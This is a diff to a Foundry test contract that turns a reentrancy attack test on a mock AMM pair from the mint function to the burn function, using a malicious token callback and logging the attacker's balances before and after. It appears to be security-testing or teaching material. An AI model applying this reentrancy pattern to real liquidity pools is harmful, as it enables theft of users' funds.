@@ -77,8 +77,8 @@ contract ReEntrancyTest is Test, Users {
             _createUserGroup("LIQUIDITY PROVIDER", 2, 100 ether);
         _liquidityProviders = liquidityProviders;
 
-        _mintMockTokensForUsers(liquidityProviders, TokenGood, 5000);
-        _mintMaliciousTokensForUsers(liquidityProviders, TokenEvil, 5000);
+        _mintMockTokensForUsers(liquidityProviders, TokenGood, 50000);
+        _mintMaliciousTokensForUsers(liquidityProviders, TokenEvil, 50000);
     }
 
     function _mintMockTokensForUsers(
@@ -121,7 +121,7 @@ contract ReEntrancyTest is Test, Users {
         }
     }
 
-    function testAttackOnMint() external {
+    function testAttackOnBurn() external {
         (address tokenA, address tokenB) = PairX.getTokens();
 
         address liquidityProvider = _liquidityProviders[0];
@@ -129,60 +129,57 @@ contract ReEntrancyTest is Test, Users {
         _addLiquidity(liquidityProvider, tokenA, address(PairX), 100);
         _addLiquidity(liquidityProvider, tokenB, address(PairX), 100);
 
-        console.log("*--[Hack] Mint: normal call start");
-        console.log("|");
-
         vm.prank(liquidityProvider);
         PairX.mint(liquidityProvider);
-
-        console.log("|");
-        console.log("*--[Hack] Mint: normal call end");
-        console.log(" \\_____________________________");
-        console.log(" /");
 
         _addLiquidity(_attacker, tokenA, address(PairX), 100);
         _addLiquidity(_attacker, tokenB, address(PairX), 100);
 
         vm.startPrank(_attacker);
 
-        TokenEvil.setAttackOn("MINT");
+        uint256 liquidityTokens = PairX.mint(_attacker);
 
-        console.log("*--[Hack] Mint: normal call start");
+        TokenEvil.setAttackOn("BURN");
+
+        PairX.approve(address(TokenEvil), liquidityTokens);
+        PairX.transfer(address(PairX), 1000 * _scales[tokenA]);
+
+        console.log("*--[Hack] Burn: normal call start");
         console.log("|");
 
-        PairX.mint(_attacker);
+        PairX.burn(_attacker);
 
         console.log("|");
-        console.log("*--[Hack] Mint: normal call end");
+        console.log("*--[Hack] Burn: normal call end");
         console.log(" \\_____________________________");
         console.log(" /");
 
-        uint256 balanceAfterHack = PairX.balanceOf(_attacker);
-        PairX.transfer(address(PairX), balanceAfterHack);
+        uint256 amountA = IERC20(tokenA).balanceOf(_attacker);
+        uint256 amountB = IERC20(tokenB).balanceOf(_attacker);
 
-        (uint256 amountA, uint256 amountB) = PairX.burn(_attacker);
+        uint256 denom = 1 * 10 ** 18;
 
-        console.log("*--[HACK] Burn:");
+        console.log("*--[HACK] Result:");
         console.log("|");
         console.log("    Before => After:");
         console.log(
-            "    amountA:",
-            _tokenDistributions[tokenA][_attacker],
+            "    Token A:",
+            _tokenDistributions[tokenA][_attacker] / denom,
             "=>",
-            amountA
+            amountA / denom
         );
+        // console.log(
+        //     "    diff:", amountA - _tokenDistributions[tokenA][_attacker]
+        // );
         console.log(
-            "    diff:", amountA - _tokenDistributions[tokenA][_attacker]
-        );
-        console.log(
-            "    amountB:",
-            _tokenDistributions[tokenB][_attacker],
+            "    Token B:",
+            _tokenDistributions[tokenB][_attacker] / denom,
             "=>",
-            amountB
+            amountB / denom
         );
-        console.log(
-            "    diff:", amountB - _tokenDistributions[tokenB][_attacker]
-        );
+        // console.log(
+        //     "    diff:", amountB - _tokenDistributions[tokenB][_attacker]
+        // );
         console.log(" \\_____________________________");
 
         vm.stopPrank();
